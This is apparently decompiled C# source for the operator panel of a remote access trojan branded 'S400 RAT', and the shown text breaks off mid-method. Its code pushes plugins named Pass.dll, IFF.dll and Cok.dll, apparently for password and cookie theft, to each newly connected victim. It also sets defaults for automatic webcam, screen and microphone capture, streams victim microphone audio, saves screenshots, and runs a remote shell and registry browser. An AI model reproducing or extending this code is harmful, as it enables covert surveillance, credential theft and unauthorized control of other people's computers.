using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using S400RAT;
using S400RAT.My.Resources;
using Tulpep.NotificationWindow;
using WinMM;
using ZXing;

[StandardModule]
internal sealed class Class7
{
	public sealed class Class8
	{
		public bool bool_0;

		public bool bool_1;

		public bool bool_2;

		public bool dbhqxeFdq4;

		public bool bool_3;

		public bool bool_4;

		public bool bool_5;

		public string string_0;

		public bool bool_6;

		public int int_0;

		public bool bool_7;

		public int int_1;

		public int int_2;

		public void method_0()
		{
			bool_0 = Conversions.ToBoolean(Class6.smethod_11("ShowAlert", "TRUE"));
			bool_1 = Conversions.ToBoolean(Class6.smethod_11("LOGLOGIN", "TRUE"));
			bool_2 = Conversions.ToBoolean(Class6.smethod_11("LOGCONNECTIONS", "FALSE"));
			dbhqxeFdq4 = Conversions.ToBoolean(Class6.smethod_11("LOGLERR", "TRUE"));
			bool_3 = Conversions.ToBoolean(Class6.smethod_11("LOGRERR", "TRUE"));
			bool_4 = Conversions.ToBoolean(Class6.smethod_11("LOGMSGS", "TRUE"));
			bool_5 = Conversions.ToBoolean(Class6.smethod_11("SCAUT", "TRUE"));
			string_0 = Class6.smethod_11("SCI", "5");
			bool_6 = Conversions.ToBoolean(Class6.smethod_11("CAMAUT", "TRUE"));
			int_0 = Conversions.ToInteger(Class6.smethod_11("CAMI", "5"));
			bool_7 = Conversions.ToBoolean(Class6.smethod_11("MICAUT", "TRUE"));
			int_1 = Conversions.ToInteger(Class6.smethod_11("MICI", "1"));
			int_2 = Conversions.ToInteger(Class6.smethod_11("scri", "1"));
		}

		public void method_1()
		{
			Class6.jQbZimjGko("ShowAlert", bool_0.ToString());
			Class6.jQbZimjGko("LOGLOGIN", bool_1.ToString());
			Class6.jQbZimjGko("LOGCONNECTIONS", bool_2.ToString());
			Class6.jQbZimjGko("LOGLERR", dbhqxeFdq4.ToString());
			Class6.jQbZimjGko("LOGRERR", bool_3.ToString());
			Class6.jQbZimjGko("LOGMSGS", bool_4.ToString());
			Class6.jQbZimjGko("SCAUT", bool_5.ToString());
			Class6.jQbZimjGko("SCI", string_0.ToString());
			Class6.jQbZimjGko("CAMAUT", bool_6.ToString());
			Class6.jQbZimjGko("CAMI", int_0.ToString());
			Class6.jQbZimjGko("MICAUT", bool_7.ToString());
			Class6.jQbZimjGko("MICI", int_1.ToString());
			Class6.jQbZimjGko("scri", int_2.ToString());
		}
	}

	public sealed class Class9
	{
		public byte[] byte_0;

		public string string_0;

		public string string_1;

		public Class9(string string_2)
		{
			byte[] array = File.ReadAllBytes(Application.StartupPath + "\\FC\\" + string_2);
			bool bool_ = true;
			byte_0 = Class6.smethod_16(array, ref bool_);
			string_0 = string_2;
			string_1 = Class6.smethod_13(byte_0);
		}
	}

	public delegate void Delegate0(object object_0);

	public static Class8 class8_0;

	public static WebClient webClient_0;

	public static string string_0;

	public static SK sk_0;

	public static long long_0;

	public static long long_1;

	public static string string_1;

	public static object object_0;

	public static BarcodeReader barcodeReader_0;

	public static object ocVikpVjCJ;

	public static object object_1;

	public static object object_2;

	public static string string_2;

	public static int int_0;

	public static int int_1;

	public static int int_2;

	public static int int_3;

	public static int int_4;

	public static int int_5;

	public static int int_6;

	public static int int_7;

	public static int int_8;

	public static int int_9;

	public static int dtTiiFuSjc;

	public static int int_10;

	public static int int_11;

	public static int int_12;

	public static int int_13;

	public static List<string> list_0;

	public static List<Class9> list_1;

	public static List<Client> list_2;

	public static GClass3 gclass3_0;

	public static WaveOut waveOut_0;

	public static WaveOut waveOut_1;

	public static bool bool_0;

	public static bool bool_1;

	public static bool bool_2;

	public static Bitmap bitmap_0;

	public static string string_3;

	public static string string_4;

	public static string string_5;

	public static int int_14;

	public static object object_3;

	public static object object_4;

	public static readonly List<string> list_3;

	public static readonly List<string> list_4;

	static Class7()
	{
		webClient_0 = new WebClient();
		barcodeReader_0 = new BarcodeReader();
		string_5 = "cc";
		int_14 = 0;
		list_3 = new List<string>();
		list_4 = new List<string>();
		class8_0 = new Class8();
		string_0 = "s400 RAT";
		long_0 = 0L;
		long_1 = 0L;
		string_1 = "|S400|";
		int_0 = 1;
		int_1 = 2;
		int_2 = 3;
		int_3 = 4;
		int_4 = 5;
		int_5 = 6;
		int_6 = 7;
		int_7 = 8;
		int_8 = 9;
		int_9 = 10;
		dtTiiFuSjc = 11;
		int_10 = 12;
		int_11 = 13;
		int_12 = 14;
		list_0 = new List<string>();
		list_1 = new List<Class9>();
		list_2 = new List<Client>();
		gclass3_0 = new GClass3(Application.StartupPath + "\\GeoIP.dat", 1);
		bool_0 = true;
	}

	public static object smethod_0(string string_6)
	{
		return Encoding.UTF8.GetString(Convert.FromBase64String(string_6));
	}

	public static object smethod_1(byte[] byte_0)
	{
		using GZipStream gZipStream = new GZipStream(new MemoryStream(byte_0), CompressionMode.Decompress);
		byte[] array = new byte[4096];
		using MemoryStream memoryStream = new MemoryStream();
		int num;
		do
		{
			num = gZipStream.Read(array, 0, 4096);
			if (num > 0)
			{
				memoryStream.Write(array, 0, num);
			}
		}
		while (num > 0);
		return memoryStream.ToArray();
	}

	public static Image smethod_2(string string_6)
	{
		byte[] array = (byte[])smethod_1(Convert.FromBase64String(string_6));
		MemoryStream memoryStream = new MemoryStream(array, 0, array.Length);
		memoryStream.Write(array, 0, array.Length);
		return Image.FromStream(memoryStream, useEmbeddedColorManagement: true);
	}

	public static string smethod_3(object object_5)
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		string result = default(string);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					if (!Operators.ConditionalCompareObjectGreaterEqual(object_5, 1073741824, TextCompare: false))
					{
						if (!Operators.ConditionalCompareObjectGreaterEqual(object_5, 1048576, TextCompare: false))
						{
							if (!Operators.ConditionalCompareObjectGreaterEqual(object_5, 1024, TextCompare: false))
							{
								if (Operators.ConditionalCompareObjectLess(object_5, 1024, TextCompare: false))
								{
									result = Conversions.ToString(Conversion.Fix(RuntimeHelpers.GetObjectValue(object_5)));
								}
							}
							else
							{
								result = Strings.Format(Operators.DivideObject(object_5, 1024), "#0.00");
							}
						}
						else
						{
							result = Strings.Format(Operators.DivideObject(Operators.DivideObject(object_5, 1024), 1024), "#0.00");
						}
					}
					else
					{
						result = Strings.Format(Operators.DivideObject(Operators.DivideObject(Operators.DivideObject(object_5, 1024), 1024), 1024), "#0.00");
					}
					goto end_IL_0000;
				case 248:
					num = -1;
					switch (num2)
					{
					case 2:
						result = "0,00";
						goto end_IL_0000;
					}
					break;
				}
				goto IL_013d;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 248;
				continue;
			}
			break;
			IL_013d:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string smethod_4(object object_5)
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		string result = default(string);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					if (!Operators.ConditionalCompareObjectGreaterEqual(object_5, 1073741824, TextCompare: false))
					{
						if (Operators.ConditionalCompareObjectGreaterEqual(object_5, 1048576, TextCompare: false))
						{
							result = Strings.Format(Operators.DivideObject(Operators.DivideObject(object_5, 1024), 1024), "#0.00") + " MB";
						}
						else if (Operators.ConditionalCompareObjectGreaterEqual(object_5, 1024, TextCompare: false))
						{
							result = Strings.Format(Operators.DivideObject(object_5, 1024), "#0.00") + " KB";
						}
						else if (Operators.ConditionalCompareObjectLess(object_5, 1024, TextCompare: false))
						{
							result = Conversions.ToString(Operators.ConcatenateObject(Conversion.Fix(RuntimeHelpers.GetObjectValue(object_5)), " KB"));
						}
					}
					else
					{
						result = Strings.Format(Operators.DivideObject(Operators.DivideObject(Operators.DivideObject(object_5, 1024), 1024), 1024), "#0.00") + " GB";
					}
					goto end_IL_0000;
				case 285:
					num = -1;
					switch (num2)
					{
					case 2:
						result = "0,00 KB";
						goto end_IL_0000;
					}
					break;
				}
				goto IL_0162;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 285;
				continue;
			}
			break;
			IL_0162:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static Class9 smethod_5(string string_6, string string_7)
	{
		if (string_6 != null)
		{
			List<Class9>.Enumerator enumerator = default(List<Class9>.Enumerator);
			try
			{
				enumerator = list_1.GetEnumerator();
				while (enumerator.MoveNext())
				{
					Class9 current = enumerator.Current;
					if (Operators.CompareString(current.string_0, string_6.ToLower(), TextCompare: false) == 0)
					{
						return current;
					}
				}
			}
			finally
			{
				enumerator.Dispose();
			}
		}
		if (string_7 != null)
		{
			List<Class9>.Enumerator enumerator2 = default(List<Class9>.Enumerator);
			try
			{
				enumerator2 = list_1.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					Class9 current2 = enumerator2.Current;
					if (Operators.CompareString(current2.string_1, string_7, TextCompare: false) == 0)
					{
						return current2;
					}
				}
			}
			finally
			{
				enumerator2.Dispose();
			}
		}
		return null;
	}

	public static object gsciXiVbtJ(object object_5)
	{
		object result;
		try
		{
			result = RuntimeHelpers.GetObjectValue((object_5 == null) ? "?" : ((((DataGridViewBand)object_5).Tag == null) ? "?" : Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("|'|", RuntimeHelpers.GetObjectValue(((DataGridViewRow)object_5).Cells[int_0].Value))), "|'|")), RuntimeHelpers.GetObjectValue(((DataGridViewRow)object_5).Cells[int_3].Value))), "|'|")), RuntimeHelpers.GetObjectValue(((DataGridViewRow)object_5).Cells[int_9].Value))), "|'|")), RuntimeHelpers.GetObjectValue(((DataGridViewRow)object_5).Cells[int_7].Value))), "")));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			result = "?";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool smethod_6(object object_5, object object_6, bool bool_3)
	{
		try
		{
			string text = ((!bool_3) ? ("inv" + string_1 + ((Class9)object_6).string_1 + string_1 + ((Client)object_5).ip() + string_1) : ("ret" + string_1 + ((Class9)object_6).string_1 + string_1));
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(Class6.smethod_3(ref text), 0, text.Length);
			if (!((Client)object_5).plg.Contains(((Class9)object_6).string_1))
			{
				memoryStream.Write(((Class9)object_6).byte_0, 0, ((Class9)object_6).byte_0.Length);
			}
			else
			{
				memoryStream.WriteByte(40);
			}
			((Client)object_5).Send(memoryStream.ToArray());
			return true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public static Form smethod_7(string string_6)
	{
		return Class2.FEo51Ss0j.OpenForms[string_6];
	}

	public static void smethod_8(object object_5)
	{
		IEnumerator enumerator = ((Form1)object_1).L1.SelectedRows.GetEnumerator();
		enumerator.Reset();
		byte[] b;
		if (NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_5), new object[1] { 0 }, null) is string)
		{
			string text = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_5), new object[1] { 0 }, null)));
			byte[] array = Class6.smethod_3(ref text);
			NewLateBinding.LateIndexSetComplex(RuntimeHelpers.GetObjectValue(object_5), new object[2] { 0, text }, null, OptimisticSet: true, RValueBase: false);
			b = array;
		}
		else
		{
			b = (byte[])NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_5), new object[1] { 0 }, null);
		}
		Color color = default(Color);
		while (enumerator.MoveNext())
		{
			DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
			((Client)dataGridViewRow.Tag).Send(b);
			DataGridViewCellStyle defaultCellStyle = dataGridViewRow.DefaultCellStyle;
			object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_5), new object[1] { 1 }, null));
			Color obj;
			if (objectValue != null)
			{
				obj = ((objectValue == null) ? default(Color) : ((Color)objectValue));
			}
			else
			{
				obj = color;
			}
			Color foreColor = obj;
			defaultCellStyle.ForeColor = foreColor;
		}
	}

	public static void smethod_9(object object_5)
	{
		Client client = (Client)NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_5), new object[1] { 0 }, null);
		byte[] byte_ = (byte[])NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_5), new object[1] { 1 }, null);
		string[] array = Strings.Split(Class6.smethod_4(ref byte_), string_1);
		try
		{
			string text = array[0];
			if (Operators.CompareString(text, "FCC", TextCompare: false) == 0)
			{
				Application.DoEvents();
				if (!((Control)object_1).InvokeRequired)
				{
					if ((notf)smethod_7("YyUNAS" + client.ip()) == null)
					{
						try
						{
							Class9 object_6 = smethod_5("Pass.dll", null);
							smethod_6(client, object_6, bool_3: false);
							Class9 object_7 = smethod_5("IFF.dll", null);
							smethod_6(client, object_7, bool_3: false);
							Class9 object_8 = smethod_5("Cok.dll", null);
							smethod_6(client, object_8, bool_3: false);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
				}
			}
			switch (text)
			{
			case "Ex":
			{
				Manager manager6 = (Manager)smethod_7("m" + client.ip());
				if (manager6 != null)
				{
				}
				return;
			}
			case "un":
			{
				Manager manager11 = (Manager)smethod_7("m" + client.ip());
				if (manager11 == null)
				{
					return;
				}
				if (manager11 != null)
				{
					try
					{
						manager11.Instal.Items.Clear();
						string[] array67 = Strings.Split(array[1], "\r\n");
						string[] array68 = array67;
						foreach (string text33 in array68)
						{
							if (Operators.CompareString(text33, "N/A%|%", TextCompare: false) != 0)
							{
								string[] array69 = Strings.Split(text33, "%|%");
								ListViewItem listViewItem27 = new ListViewItem();
								listViewItem27.Text = array69[0];
								listViewItem27.ImageIndex = 0;
								manager11.Instal.Items.Add(listViewItem27);
							}
						}
					}
					catch (Exception projectError87)
					{
						ProjectData.SetProjectError(projectError87);
						ProjectData.ClearProjectError();
					}
				}
				manager11.SL.Text = array[1];
				if (array[1].StartsWith("rs:!-->"))
				{
					manager11.shStarted = 0;
				}
				return;
			}
			case "tcp":
			{
				Manager manager4 = (Manager)smethod_7("m" + client.ip());
				if (manager4 == null)
				{
					return;
				}
				lock (manager4.Prog)
				{
					string left5 = array[1];
					if (Operators.CompareString(left5, "~", TextCompare: false) == 0)
					{
						string[] array24 = Strings.Split(array[2], "*");
						manager4.Prog.Value = 0;
						manager4.Prog.Maximum = array24.Length;
						List<ListViewItem> list4 = new List<ListViewItem>();
						int num11 = array24.Length - 1;
						for (int m = 0; m <= num11; m++)
						{
							string[] array25 = Strings.Split(array24[m], ",");
							if (manager4.LTCP.Items.ContainsKey(array25[0] + array25[1]))
							{
								ListViewItem listViewItem8 = manager4.LTCP.Items[array25[0] + array25[1]];
								listViewItem8.SubItems[4].Text = ((TcpState)Conversions.ToInteger(array25[2])).ToString();
								Color foreColor = listViewItem8.ForeColor;
								switch (Conversions.ToInteger(array25[2]))
								{
								case 4:
									listViewItem8.ForeColor = Color.YellowGreen;
									listViewItem8.ImageIndex = 7;
									break;
								case 5:
									listViewItem8.ForeColor = Color.LimeGreen;
									listViewItem8.ImageIndex = 6;
									break;
								case 1:
								case 8:
								case 9:
								case 11:
								case 12:
									listViewItem8.ImageIndex = 5;
									listViewItem8.ForeColor = Color.Red;
									break;
								}
								continue;
							}
							ListViewItem listViewItem9 = new ListViewItem(array25[0].Split(':')[0]);
							listViewItem9.Name = array25[0] + array25[1];
							listViewItem9.Tag = array25[0] + array25[1];
							listViewItem9.SubItems.Add(array25[0].Split(':')[1]);
							listViewItem9.SubItems.Add(array25[1].Split(':')[0]);
							listViewItem9.SubItems.Add(array25[1].Split(':')[1]);
							listViewItem9.SubItems.Add(((TcpState)Conversions.ToInteger(array25[2])).ToString());
							listViewItem9.SubItems.Add(array25[3]);
							switch (Conversions.ToInteger(array25[2]))
							{
							case 3:
							case 4:
								listViewItem9.ForeColor = Color.YellowGreen;
								listViewItem9.ImageIndex = 7;
								break;
							case 5:
								listViewItem9.ForeColor = Color.LimeGreen;
								listViewItem9.ImageIndex = 6;
								break;
							case 1:
							case 8:
							case 9:
							case 11:
							case 12:
								listViewItem9.ForeColor = Color.Red;
								listViewItem9.ImageIndex = 5;
								break;
							}
							listViewItem9.ImageIndex = 3;
							list4.Add(listViewItem9);
							if (list4.Count > 20)
							{
								manager4.LTCP.Items.AddRange(list4.ToArray());
								list4.Clear();
								ColumnHeader columnHeader_ = manager4.LTCP.columnHeader_0;
								if (columnHeader_ == null)
								{
									manager4.LTCP.GClass9_ColumnClick(manager4.LTCP, new ColumnClickEventArgs(0));
									continue;
								}
								columnHeader_.Tag = RuntimeHelpers.GetObjectValue(Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_.Tag), "+", TextCompare: false) ? "-" : (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_.Tag), "-", TextCompare: false) ? "+" : "-"));
								manager4.LTCP.GClass9_ColumnClick(manager4.LTCP, new ColumnClickEventArgs(columnHeader_.Index));
							}
						}
						if (manager4.TCPFX)
						{
							manager4.LTCP.method_3();
							manager4.TCPFX = false;
						}
						if (list4.Count > 0)
						{
							manager4.LTCP.Items.AddRange(list4.ToArray());
							list4.Clear();
							ColumnHeader columnHeader_2 = manager4.LTCP.columnHeader_0;
							if (columnHeader_2 == null)
							{
								manager4.LTCP.GClass9_ColumnClick(manager4.LTCP, new ColumnClickEventArgs(0));
							}
							else
							{
								columnHeader_2.Tag = RuntimeHelpers.GetObjectValue(Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_2.Tag), "+", TextCompare: false) ? "-" : (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_2.Tag), "-", TextCompare: false) ? "+" : "-"));
								manager4.LTCP.GClass9_ColumnClick(manager4.LTCP, new ColumnClickEventArgs(columnHeader_2.Index));
							}
						}
						manager4.TCPNXT = true;
					}
					else if (Operators.CompareString(left5, "RM", TextCompare: false) != 0)
					{
						if (Operators.CompareString(left5, "ER", TextCompare: false) == 0)
						{
							manager4.SL.Text = array[2];
						}
					}
					else
					{
						int num12 = array.Length - 1;
						for (int n = 2; n <= num12; n++)
						{
							manager4.LTCP.Items.RemoveByKey(array[n]);
						}
					}
					return;
				}
			}
			case "MIC":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex60)
					{
						ProjectData.SetProjectError(ex60);
						Exception projectError85 = ex60;
						ProjectData.SetProjectError(projectError85);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					Mic mic = (Mic)smethod_7("mic" + client.ip());
					string left15 = array[2];
					if (Operators.CompareString(left15, "~", TextCompare: false) == 0)
					{
						if (mic == null)
						{
							Mic mic2 = new Mic();
							mic2.Name = "mic" + client.ip();
							mic2.sk = client;
							mic2.osk = client.osk;
							int num27 = array.Length - 1;
							for (int num28 = 3; num28 <= num27; num28++)
							{
								mic2.ComboBox1.Items.Add(array[num28]);
							}
							mic2.Show();
						}
					}
					else if (Operators.CompareString(left15, "!", TextCompare: false) == 0)
					{
						if (mic != null)
						{
							byte[] array63 = (byte[])NewLateBinding.LateIndexGet(Class6.smethod_17(byte_, array[3] + string_1), new object[1] { 1 }, null);
							if (array63[0] == 31)
							{
								byte[] byte_2 = array63;
								bool flag = false;
								array63 = Class6.smethod_16(byte_2, ref flag);
							}
							mic.Text = Class6.smethod_10(array63.Length) + " " + mic.QQ;
							if (Conversions.ToInteger(array[3]) != 0)
							{
								waveOut_1.Write(array63);
							}
							else
							{
								waveOut_0.Write(array63);
							}
						}
						else
						{
							client.CN = false;
						}
					}
					else if (Operators.CompareString(left15, "ER", TextCompare: false) == 0)
					{
						if (mic == null)
						{
							client.CN = false;
							return;
						}
						mic.ComboBox1.Enabled = true;
						mic.ComboBox2.Enabled = true;
						mic.Button1.Text = "Start";
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
				}
				return;
			case "post+":
			{
				client.isPL = true;
				DW dW2 = new DW();
				dW2.FN = array[1];
				dW2.SZ = Conversions.ToInteger(array[2]);
				dW2.c = client;
				dW2.osk = client.osk;
				dW2.Name = dW2.osk.ip() + array[1];
				dW2.Show();
				return;
			}
			case "RG":
				if (!((Control)object_1).InvokeRequired)
				{
					Manager manager12 = (Manager)smethod_7("m" + client.ip());
					lock (manager12.Prog)
					{
						string left17 = array[1];
						if (Operators.CompareString(left17, "ER", TextCompare: false) != 0)
						{
							if (Operators.CompareString(left17, "~", TextCompare: false) != 0)
							{
								return;
							}
							manager12.RGk.Enabled = true;
							manager12.RGLIST.Enabled = true;
							TreeNodeCollection node2 = manager12.RGk.Nodes;
							TreeNode treeNode = Class6.smethod_15(array[2], manager12.RGk.Nodes);
							List<string> list9 = new List<string>();
							if (manager12.RGk.SelectedNode == treeNode)
							{
								manager12.RGLIST.Items.Clear();
							}
							Manager.GClass13 gClass3;
							if (!manager12.RGCH.Contains(array[2]))
							{
								gClass3 = new Manager.GClass13();
								gClass3.string_0 = array[2];
								manager12.RGCH.Add(gClass3, array[2]);
							}
							else
							{
								gClass3 = (Manager.GClass13)manager12.RGCH[array[2]];
								gClass3.list_0.Clear();
								gClass3.list_1.Clear();
							}
							string[] array72 = Strings.Split(array[3], "[,]");
							manager12.Prog.Value = 0;
							manager12.Prog.Maximum = array72.Length;
							string[] array73 = array72;
							foreach (string text34 in array73)
							{
								if (Operators.CompareString(text34, string.Empty, TextCompare: false) == 0)
								{
									continue;
								}
								string[] array74 = Strings.Split(text34, "[;]");
								try
								{
									manager12.Prog.Value++;
									if (array74.Length <= 1)
									{
										gClass3.list_1.Add(array74[0]);
										treeNode.Nodes.Add(array74[0], array74[0]);
										if (!treeNode.Nodes.ContainsKey(array74[0]))
										{
											list9.Add(array74[0]);
										}
										continue;
									}
									if (manager12.RGk.SelectedNode == treeNode)
									{
										ListViewItem listViewItem28 = manager12.RGLIST.Items.Add(array74[0]);
										listViewItem28.SubItems.Add(array74[1]);
										listViewItem28.SubItems.Add(array74[2]);
										listViewItem28.ImageIndex = ((Operators.CompareString(array74[1], "String", TextCompare: false) == 0) ? 1 : 2);
									}
									gClass3.list_0.Add(array74);
								}
								catch (Exception ex68)
								{
									ProjectData.SetProjectError(ex68);
									Exception projectError95 = ex68;
									ProjectData.SetProjectError(projectError95);
									ProjectData.ClearProjectError();
									ProjectData.ClearProjectError();
								}
							}
							try
							{
								foreach (TreeNode node in treeNode.Nodes)
								{
									if (list9.Contains(node.Text))
									{
										list9.Remove(node.Text);
									}
								}
							}
							finally
							{
								IEnumerator enumerator13 = default(IEnumerator);
								if (enumerator13 is IDisposable)
								{
									(enumerator13 as IDisposable).Dispose();
								}
							}
							List<string>.Enumerator enumerator14 = default(List<string>.Enumerator);
							try
							{
								enumerator14 = list9.GetEnumerator();
								while (enumerator14.MoveNext())
								{
									string current2 = enumerator14.Current;
									treeNode.Nodes.RemoveByKey(current2);
								}
							}
							finally
							{
								enumerator14.Dispose();
							}
							if (treeNode == manager12.RGk.SelectedNode)
							{
								treeNode.Expand();
							}
							manager12.RGLIST.method_3();
							manager12.Prog.Value = 0;
						}
						else
						{
							manager12.RGk.Enabled = true;
							manager12.RGLIST.Enabled = true;
							manager12.SL.Text = Class6.smethod_9(array[2]);
						}
						return;
					}
				}
				((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
				return;
			case "rs":
			{
				Manager manager9 = (Manager)smethod_7("m" + client.ip());
				if (manager9 == null)
				{
					return;
				}
				lock (manager9.T1)
				{
					manager9.T1.SelectionStart = manager9.T1.TextLength;
					manager9.T1.AppendText(Class6.smethod_9(array[1].Replace("\r\n", string.Empty)) + "\r\n");
					manager9.T1.SelectionStart = manager9.T1.TextLength;
					manager9.T1.ScrollToCaret();
					return;
				}
			}
			case "rsc":
			{
				Manager manager8 = (Manager)smethod_7("m" + client.ip());
				if (manager8 != null)
				{
					manager8.T2.ReadOnly = true;
					manager8.T2.BackColor = Color.Gray;
					manager8.shStarted = 0;
				}
				return;
			}
			case "PLG":
			{
				Class9 @class = smethod_5("Manger.dll", null);
				MemoryStream memoryStream = new MemoryStream();
				string text11 = "PLG" + string_1;
				byte[] array17 = Class6.smethod_3(ref text11);
				memoryStream.Write(array17, 0, array17.Length);
				memoryStream.Write(@class.byte_0, 0, @class.byte_0.Length);
				client.Send(memoryStream.ToArray());
				return;
			}
			case "SZ":
				try
				{
					Interaction.MsgBox("Display Resolution : " + array[3], MsgBoxStyle.Information, "Display Resolution Information");
					Class2.XTBfo6WOm.sc.Guna2GradientButton9.Enabled = true;
					return;
				}
				catch (Exception projectError65)
				{
					ProjectData.SetProjectError(projectError65);
					ProjectData.ClearProjectError();
					return;
				}
			case "scPK":
			{
				sc sc = (sc)smethod_7("sc" + array[1]);
				if (sc != null)
				{
					lock (sc)
					{
						sc sc2 = sc;
						sc2.fps++;
						sc.pkt = byte_.Length;
						if (array[2].Length == 0)
						{
							return;
						}
						Bitmap bitmap = (Bitmap)Image.FromStream(new MemoryStream((byte[])NewLateBinding.LateIndexGet(Class6.smethod_17(byte_, array[2] + string_1), new object[1] { 1 }, null)));
						if (bitmap.Width == 0)
						{
							return;
						}
						string[] array12 = Strings.Split(array[2], "-");
						string[] array13 = Strings.Split(array12[0], ",");
						Size size = new Size(Conversions.ToInteger(array13[0]), Conversions.ToInteger(array13[1]));
						int num3 = Conversions.ToInteger(array12[1]);
						if (sc.Oimg.Size != size)
						{
							sc.Oimg = new Bitmap(size.Width, size.Height, PixelFormat.Format32bppPArgb);
						}
						PixelFormat format = PixelFormat.Format32bppArgb;
						int num4 = 0;
						int num5 = array12.Length - 1;
						for (int l = 2; l <= num5; l++)
						{
							string[] array14 = Strings.Split(array12[l], ",");
							Rectangle rect = new Rectangle(Conversions.ToInteger(array14[0]), Conversions.ToInteger(array14[1]), bitmap.Width, num3);
							BitmapData bitmapData = sc.Oimg.LockBits(rect, ImageLockMode.WriteOnly, format);
							BitmapData bitmapData2 = bitmap.LockBits(new Rectangle(0, num4, rect.Width, rect.Height), ImageLockMode.ReadOnly, format);
							byte[] array15 = new byte[Math.Abs(bitmapData.Stride) * bitmapData.Height - 1 + 1 - 1 + 1];
							Class6.memcpy(bitmapData.Scan0, bitmapData2.Scan0, array15.Length);
							sc.Oimg.UnlockBits(bitmapData);
							bitmap.UnlockBits(bitmapData2);
							num4 += num3;
						}
						sc.p.Image = (Image)sc.Oimg.Clone();
						if (!sc.CheckBox3.Checked)
						{
							return;
						}
						try
						{
							sc.Oimg.Save(sc.Folder + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg);
							return;
						}
						catch (Exception ex13)
						{
							ProjectData.SetProjectError(ex13);
							Exception projectError23 = ex13;
							ProjectData.SetProjectError(projectError23);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							return;
						}
					}
				}
				client.CN = false;
				return;
			}
			case "CH":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex14)
					{
						ProjectData.SetProjectError(ex14);
						Exception projectError24 = ex14;
						ProjectData.SetProjectError(projectError24);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					Chat chat = (Chat)smethod_7("ch" + client.ip());
					string left3 = array[2];
					if (Operators.CompareString(left3, "~", TextCompare: false) != 0)
					{
						if (Operators.CompareString(left3, "!", TextCompare: false) == 0)
						{
							chat.T2.Enabled = true;
							lock (chat)
							{
								chat.T1.AppendText("Connected ..\r\n");
								return;
							}
						}
						if (Operators.CompareString(left3, "@", TextCompare: false) != 0)
						{
							return;
						}
						lock (chat)
						{
							chat.T1.SelectionStart = chat.T1.TextLength;
